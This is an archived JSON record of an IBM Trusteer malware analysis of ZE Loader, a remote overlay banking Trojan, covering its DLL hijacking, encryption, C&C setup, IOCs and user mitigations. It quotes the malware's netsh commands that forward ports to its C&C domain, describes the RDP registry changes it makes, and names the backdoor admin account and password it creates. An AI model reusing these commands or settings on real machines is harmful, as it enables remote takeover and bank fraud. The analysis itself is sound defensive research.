{
    "id": "c50b0e60-bac0-42f3-b53a-9098405c16e2",
    "created_at": "2023-01-12T15:02:12.934042Z",
    "updated_at": "2025-03-27T02:05:30.850192Z",
    "deleted_at": null,
    "sha1_hash": "54204e82f6e34229f9db0d766f3cc146b577fce9",
    "title": "2021-09-23 - New ZE Loader Targets Online Banking Users",
    "authors": "",
    "file_creation_date": "2022-05-28T19:44:33Z",
    "file_modification_date": "2022-05-28T19:44:33Z",
    "file_size": 6027227,
    "plain_text": "# New ZE Loader Targets Online Banking Users\n\n**[securityintelligence.com/posts/new-ze-loader-targets-online-banking/](https://securityintelligence.com/posts/new-ze-loader-targets-online-banking/)**\n\n[Banking & Finance September 23, 2021](https://securityintelligence.com/category/topics/banking-financial-services-industry/)\nBy [Nir Somech co-authored by Chen Nahman 11 min read](https://securityintelligence.com/author/nir-somech/)\nIBM Trusteer closely follows developments in the financial cyber crime arena. Recently, we discovered a new\nremote overlay malware that is more persistent and more sophisticated than most current-day codes. In this\npost we will dive into the technical details of the sample we worked on and present ZE Loader’s capabilities and\nfeatures. The parts that differ from other malware of this kind are:\n\n\n-----\n\nInstallation of a backdoor to the victim s device\nRemaining stealthy in the guise of legitimate software\nHolding permanent assets on the victim’s device\nStealing user credentials.\n\nAnother aspect we examine here is the malware’s algorithms used in the encryption of its resources and events.\nWe will suggest some tactics to detect the presence of ZE Loader on infected devices to mitigate its potential\nimpact.\n\n## Overlay Malware Is an Enduring Threat\n\nOverlay malware is not a new threat, nor is it very sophisticated. Yet, this malware category, which typically\nspreads in Latin America, Spain and Portugal, is an enduring one. We keep seeing it used in attacks on online\nbanking users in those regions, and its success fuels the interest of cyber criminals to continue using it.\n\n[In the case of ZE Loader, we did see some new features that push the typical boundaries of overlay Trojans. For](https://securityintelligence.com/posts/vizom-malware-targets-brazilian-bank-customers-remote-overlay/)\nexample, most malware in this category does not keep assets on the infected device, but ZE Loader does. In\nmost cases, this sort of malware does not go to the lengths of hiding its presence; its lifecycle is short and the\neffort is futile. ZE Loader does use some stealth tactics.\n\n## Typical Attack Anatomy\n\nA remote overlay attack follows a rather familiar path. Once the user becomes infected — usually via malspam,\nphishing pages or malicious attachments — the malware is installed on the target device. In most cases, the\nmalware begins monitoring browser window names for a targeted bank’s site. It then goes into action upon\naccess to a hard-coded list of entities. With the regional focus of this malware type, it mostly goes after local\nbanks.\n\nOnce the user lands on a targeted website, the attacker is notified in real-time. The attacker can then take over\nthe device remotely using the remote access feature. As the victim accesses their online banking account, the\nattacker can see their activity and choose a time to interject. To trick users into divulging authentication codes or\nother personal data, attackers display full-screen overlay images that keep the victim from continuing the\nbanking session. In the background, the attacker initiates a fraudulent money transfer from the compromised\naccount and leverages the victim’s presence in real-time to obtain the required information to complete it.\n\nIt’s not an automated fraud scheme, but it is one that keeps working in certain parts of the world, which makes it\na risk that banks must continue to reckon with.\n\n\n-----\n\n_Figure 1: Remote overlay Trojan: Typical kill chain (source: IBM Trusteer)_\n\n## ZE Loader’s Execution and Post-Infection Behavior\n\nZE Loader hides as part of legitimate software by performing a dynamic link library (DLL) hijacking. Using a\nmalicious DLL instead of the original one, it replaces a DLL named DVDSetting.dll.\n\nIn a recent campaign we analyzed, the attackers were using several payload options to infect the victim’s\ndevice. These payloads’ folders contained binary files from legitimate applications. Once executed, the\nseemingly benign applications would load the malware’s malicious DLL.\n\nZE Loader keeps its assets, such as fake images and files it runs, in a legitimate software’s folder as shown\nbelow.\n\n_Figure 2: ZE Loader’s malicious elements hidden inside a legitimate program’s folder_\n\nThe malicious files being fetched from such folders are:\n\nFile/ DLL name Type Purpose\n\nJDK SDK Folder Contains all the images the malware uses in encrypted form.\n\n\n-----\n\nFile/ DLL name Type Purpose\n\n\nDVDSettings.dll A Dephi\nDLL\n\noperation.dll A Dephi\nDLL\n\nprocSettings.dll A Delphi\nDLL\n\n\nDecrypts and loads relevant components of the malware to run it.\n\nResponsible for installing and running remote desktop protocol (RDP) service\non the infected device.\n\nContains the main logic of the attack.\n\n\nHost Contains malware’s settings in encrypted form.\n\nisCon.tlb Contains malware’s settings in encrypted form.\n\nTo evade any antivirus which might detect some of its resources, the ZE Loader changes its names or file\nextensions. For example:\n\nIsName.name will change to\nc0V3l3A9R0P4b9w1c7q3W7M6u4A2d9Z5B9Q2F4T2A0T2h7U9M8T6p8M6r3H4_.exe\n\n_Figure 3: ZE Loader switches file names to evade antivirus detection_\n\nOptional payload paths we found when we analyzed this malware were:\n\n%programdata%\\*\\ PCHEALTH\\*\n%programfiles%\\gMDwkHvX\\*\n%userprofile%\\*\\y0X7K4P8f5z5E2R1Y6t1B8y8l6Q1v9\\*\n%userprofile%\\*\\Videos\\Vss\\I1i4M0d6N8C3a7t9C0j8N8I6I6w3f0v7A4Y1m0Z2k7Q7E6x3P0F3a5P0o4u6_.exe\n\nWhen we looked at a machine we infected with ZE Loader, we saw additional file paths used:\n\nC:\\ProgramData\\Trusteer\\PCHEALTH\\avformat.dll\nC:\\Program Files\\gMDwkHvX\\rdpwrap.dll\nAvira folder: C:\\Users\\****\\y0X7K4P8f5z5E2R1Y6t1B8y8l6Q1v9\\\n\nWhile we did see the malware’s operators hide it in the guise of more than one legitimate program, the\nJDK_SDK payload remained the same throughout the campaign.\n\n\n-----\n\n## ZE Loader s Attack Anatomy\n\nWhen we viewed the ZE Loader attack from an anatomy perspective, the elements interact as follows:\n\n_Figure 4: ZE Loader’s attack anatomy_\n\nRunning the legitimate program used as ZE Loader’s front also loads the malicious DLL. In this case, it is\nDVDSetting.dll, and we can see in the image below that the legitimate software imports that DLL.\n\n_Figure 5: Malicious DLL being imported instead of the original legitimate one_\n\n\n-----\n\nAfter the malicious DLL is loaded, the SetDecoderMode function in DVDSettings.dll reads the encrypted file\nprocSettings and decrypts it.\n\nThis encrypted malicious file is a UPX-packed Delphi DLL that contains most of the logic of this overlay\nmalware. Inside DVDSettings.dll there is also some embedded shellcode, also in encrypted form, which is\nresponsible for unpacking and running the procSettings UPX-packed DLL post decryption.\n\n_Figure 6: DVDSettings.dll reads the encrypted file procSettings and decrypts it_\n\nIn the image below we can see that the first call to the ‘decrypt’ function will decrypt the procSetting DLL file.\nThe second call to the ‘decrypt’ function will result in decrypting the shellcode to unpack and run the procSetting\nDLL file.\n\n\n-----\n\n_Figure 7: First call to decrypt function will decrypt the procSetting DLL file._\n\nNext, the decrypted shellcode unpacks the decrypted procSettings DLL file and then calls the entry point of\nprocSettings DLL.\n\n## The procSettings DLL\n\nTo find out more about what’s inside this core DLL, we performed a static examination of the DLL. This did not\nshed light on its functionality and rules that govern its activity. One of the things we did see is that this DLL is\nBorland Delphi compiled and that it imports different functions from different DLLs. This suggests that\nprocSettings is the DLL that holds most of the logic of the malware and its implementation.\n\nA dynamic analysis we ran allowed us to examine the exported function THetholdImplementationIntercept. We\nsaw that first the malware created a mutex with the name CodeCall.Net Mutey in order to prevent multiple\ninstances of the malware running at the same time.\n\nNext, the malware ran a check to discern whether the targeted bank application was installed on the infected\ndevice. It did that by searching the software directory under %appdatalocal%.\n\nIf the software the attackers are interested in is indeed installed on the device, it further checks if the file\nC:\\ProgramData\\OkApp.is exists. This file is one of the malware’s files, used as an indicator; this file is empty of\ncontent.\n\n_Figure 8: ZE Loader’s indicator file that checks for previous infection_\n\nIf ZE Loader’s scan identifies that this is the first time the malware has run on that device, it executes a series of\nsteps as follows.\n\n1. First, ZE Loader checks that it is running with administrator privileges.\n\n\n-----\n\n_Figure 9: ZE Loader’s privilege check — “Is user admin?”_\n\n1. ZE Loader executes a couple of Netshell commands in order to create a new connection for establishing\n\nan RDP connection to the command-and-control server (C&C).\n\n1. The first command it executes is ‘netsh interface portproxy reset’ in order to reset the proxy\n\nconfiguration settings.\n2. Next, it opens two proxy connections to eavesdrop on and have a connection to the C&C server:\n\nnetsh interface portproxy add v4tov4 listenport=1534 listenaddress=127.0.0.1 connectport=1534\nconnectaddress=controllefinaceiro2021.duckdns.org\n\nnetsh interface portproxy add v4tov4 listenport=27015 listenaddress=127.0.0.1 connectport=27015\nconnectaddress=controllefinaceiro2021.duckdns.org\n\n1. Next, ZE Loader loads the encrypted file ‘operationB’, decrypts and unpacks it. The encryption and\n\nunpacking methods are the same as before. This file is a malicious DLL that is responsible for setting an\noutbound RDP connection to the C&C.\n\n_Figure 10: ZE Loader opens an outbound RDP connection_\n\n## OperationB DLL\n\n\n-----\n\nWe began with a static examination of the malicious DLL OperationB. Examining the DLL s resource section,\nwe saw that it contained some legitimate RDP DLLs, including the right ones for each Windows architecture, as\nwell as RDP configuration files.\n\n_Figure 11: RDP files used by ZE Loader_\n\n_Figure 12: RDP configuration as used by ZE Loader_\n\n\n-----\n\nDynamically running this malicious DLL, we see that it begins by saving the RDP DLL and its configuration on\ndisk under a randomly generated directory; in this case, saved under %programFiles%.\n\n## Manipulating Security Settings\n\nIn the next step, ZE Loader manipulates some security settings to enable the attacker to have undisturbed\nremote access to the infected device.\n\nZE Loader searches for the service ‘TermService’. This service allows RDP connections to stream to and from\nthe client device. ZE Loader sets its configuration settings to SERVICE_AUTO_START with the path of the RDP\nDLL file it already saved on disk.\n\nNext, ZE Loader changes the settings of the infected device to allow and establish multiple RDP connections to\nand from that device. The following settings are toggled to ‘true’:\n\nHKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\fDenyTSConnection\nHKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core\\EnableConCurrentSessions\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AllowMultipuleTSSession\n\n_Figure 13: RDP configuration allows connections to and from the infected device_\n\nAdditional RDP settings are configured to enable the attacker to eventually use the remote access to the\ninfected device without much effort.\n\n_Figure 14: RDP configuration bypasses security on the infected device_\n\nThe malware adds a new user account to the victim’s local area network settings with the name Administart0r\nand password 123mudar. To ensure it is allowed to perform admin actions on the device, the malware adds the\nnew malicious user to the localgroup ‘administradores’.\n\n\n-----\n\n_Figure 15: ZE Loader adds a user to the administrator’s local group_\n\nIn the last step of the malware, before an attack is performed, ZE Loader further sets a new rule in the firewall\nthat allows anyone to use RDP connections.\n\n_Figure 16: ZE Loader creates firewall rule to allow RDP connections for all_\n\n## Going Into Action Mode\n\nOnce it is resident on the infected device and all the preparations are in place, ZE Loader begins monitoring the\nvictim’s activity on the web browser, waiting for them to authenticate an online banking session or access a\ndesignated banking application on the desktop. To do that, it monitors running processes and will kill the\ncorresponding process if one is started:\n\n\n-----\n\n_Figure 17: ZE Loader kills the process of designated banking apps if any are opened_\n\nAfter killing the app processes, it loads an encrypted string fetched from the file ‘Host.hst.’ This file contains the\nencrypted domain name: ‘controlefinaceiro2021.duckdns.org.’\n\nTo trick the victim into believing the app did open, the malware sets up a new window to pop up with app\nimages. It loads and decrypts an image that corresponds to the targeted bank brand from the encrypted images\ndirectory: /JDK_SDK.\n\n_Figure 18: ZE Loader loading fake images from its locally stored trove_\n\nAs part of the attack, the malware presents different pages/images that mimic bank applications in order to trick\nthe victim into entering their credentials into data fields in the image. The attacker uses those to either take the\nsession over on web browsers or access the application remotely through the victim’s device using an RDP\nconnection.\n\n\n-----\n\n## ZE Loader s Cryptography\n\nZE Loader uses a couple of cryptographic algorithms as part of its execution and to hide assets and files. The\nfollowing are the main findings from our analysis:\n\n## Decrypt(data, IV_array, IV_size, size)\n\nThis function is responsible for decrypting the different assets of the malware, including DLL files, embedded\nshellcode, images, etc.\n\nThe function’s available parameters are:\n\nData: the encrypted data to be decrypted\nIV_array: array of values needed for the decryption process\nIV_size: length of the IV array\nSize: size of the encrypted data.\n\n_Figure 19: ZE Loader’s decryption function parameters_\n\n## Command_or_decrypt(command, encrypted_str, result)\n\nThis function is responsible for the decryption of strings embedded in the sample. The available parameters of\nthe function are:\n\nCommand: there are two types of commands for this function — C & D\nEncrypted str: the encrypted string\n\n\n-----\n\nResult: array that will contain the decrypted string.\n\n_Figure 20: ZE Loader’s string decryption function parameters_\n\n## Decrypt_image(image_path, decrypted_image, key)\n\nThis function is responsible for decrypting images that the malware keeps locally, hidden in the directory\nJDK_SDK. The decryption algorithm the malware uses is the BlowFish encryption algorithm with the hard-coded\nkey ‘1’. Blowfish is a symmetric-key block cipher that provides a good encryption rate in software and was likely\nused for that reason. The parameters of the function are:\n\nImage_path: path of the encrypted image\nDecrypted_image: the decrypted image after the decryption process\nKey: key for the decryption algorithm; the key is the hard-coded char ‘1’.\n\n\n-----\n\n_Figure 21: ZE Loader’s image decryption function and its parameters_\n\n## Piecing It Together\n\nThe malware keeps encrypted images that mimic its various targets’ websites and designated applications\nlocally in the ‘JDK_SDK’ directory. After decrypting that directory, we were able to access a wide range of\ntargets. On top of popular banks, the malware targets some blockchain platforms and cryptocurrency exchange\nplatforms.\n\nThe images also led to insights regarding some of the sophisticated ways the attacker overcomes two-factor\nauthentication challenges in order to steal user credentials. For example, one of the malware’s assets named\n‘coin.tlb’ is a file that contains two encrypted strings. After decrypting the strings, we found the two strings\nbelow:\n\nZE 19/01/2021 — malware version was extracted from the malware configuration settings.\n\n## Remote Overlay Trojans Still Going Strong\n\nWhile it is a dated threat, remote overlay Trojans are an enduring staple in the cyber crime arena. Prolific in\nLatin America, they also target European countries where the same languages are spoken, so as to maximize\nthe reach of their attacks. The strength of attacks that leverage this malware type is the remote access to user\ndevices. Adding manual work in real time allows attackers to extract critical transaction elements from their\nvictims and finalize transactions that are otherwise adequately protected.\n\nWhile it lacks sophistication on the code level, its overall scheme continues to work. To mitigate the risk of\nremote overlay Trojans, here are some things users can do:\n\n[Do not open unsolicited emails and don’t click links or attachments inside such messages](https://securityintelligence.com/news/wine-themed-phishing-emails-2020/)\nDo not log in to bank accounts from an email that appears to urge action\nWhen in doubt, call your bank\nHave an antivirus installed on your device and turn on automatic updates\nKeep your operating system and all programs up to date\n\n\n-----\n\nDelete applications that are not in use\nDisable remote connections to your device. Press Windows + X à click ‘System’. From the left sidebar\nclick ‘Remote Desktop’ and make sure the remote desktop option is toggled off.\n\nTo keep up to date about IBM Trusteer blogs, visit [https://securityintelligence.com/category/x-force and find](https://securityintelligence.com/category/x-force)\ncontent that can help you better manage the risk of malware and online fraud in your personal and business\nactivities.\n\n## IOCs\n\n5bf9e6e94461ac63a5d4ce239d913f69 – DVDSetting.dll\n\n8803df5c4087add10f829b069353f5b7 – operationB\n\n520170d2edfd2bd5c3cf26e48e8c9c71 – procSettings\n\n39aa9dadd3fc2842f0f2fdcea80a94c7 – Host.hst\n\n25e60452fa27f01dc81c582a1cbec83f – IsCon.tlb\n\n4280f455cf4d4e855234fac79d5ffda0 – JDK_SDK.zip\n\nC2 Server\n\ncontrollefinaceiro2021[.]duckdns[.]org\n\n[Nir Somech](https://securityintelligence.com/author/nir-somech/)\nMalware Researcher – Trusteer IBM\n\nNir Somech is an engineer working as part of IBM X-Force research. He specializes in researching attacks\ntargeting the financial threat landscape. Nir holds ...\n\n\n-----\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-09-23 - New ZE Loader Targets Online Banking Users.pdf"
    ],
    "report_names": [
        "2021-09-23 - New ZE Loader Targets Online Banking Users.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535732,
    "ts_updated_at": 1743041130,
    "ts_creation_date": 1653767073,
    "ts_modification_date": 1653767073,
    "files": {
        "pdf": "https://archive.orkl.eu/54204e82f6e34229f9db0d766f3cc146b577fce9.pdf",
        "text": "https://archive.orkl.eu/54204e82f6e34229f9db0d766f3cc146b577fce9.txt",
        "img": "https://archive.orkl.eu/54204e82f6e34229f9db0d766f3cc146b577fce9.jpg"
    }
}